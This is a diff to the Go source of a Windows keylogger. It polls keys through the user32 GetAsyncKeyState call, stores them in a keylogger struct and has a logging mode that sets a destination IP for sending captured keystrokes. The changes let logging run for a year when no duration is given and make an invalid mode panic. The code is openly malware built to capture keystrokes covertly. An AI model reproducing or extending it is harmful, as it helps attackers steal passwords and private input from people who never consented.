@@ -1,7 +1,7 @@
 package main
 
 import (
-	"fmt"
+	//"fmt"
 	"io"
 	"os"
 	"syscall"
@@ -146,16 +146,10 @@ var (
 	getState = user32.NewProc("GetAsyncKeyState")
 )
 
-// writer used to initialize the buffered reader
-type Writer int
-
 // represents the keylogger
 type keylogger struct {
 	// true if currently logging, false if not
 	active bool
-
-	// interval on which to flush the buffer (in seconds)
-	bufferInterval float64
 
 	// all keys
 	log []key
@@ -189,6 +183,10 @@ func (k *keylogger) start(duration int) {
 	lastBufferFlush := time.Now()
 
 	k.active = true
+
+	if duration == -1 { // then the loop should run forever (until manually stopped)
+		duration = 31536000 // the amount of seconds in one year
+	}
 
 	// loops for the given amount of seconds
 	for start := time.Now(); time.Since(start) < time.Second*time.Duration(duration); {
@@ -262,7 +260,7 @@ func (k *keylogger) setMode(mode int, info string) {
 	} else if k.mode == 1 {
 		k.ipdst = info
 	} else {
-		fmt.Println("ERROR: NOT A VALID LOGGING MODE")
+		panic("ERROR: NOT A VALID LOGGING MODE")
 	}
 }
 
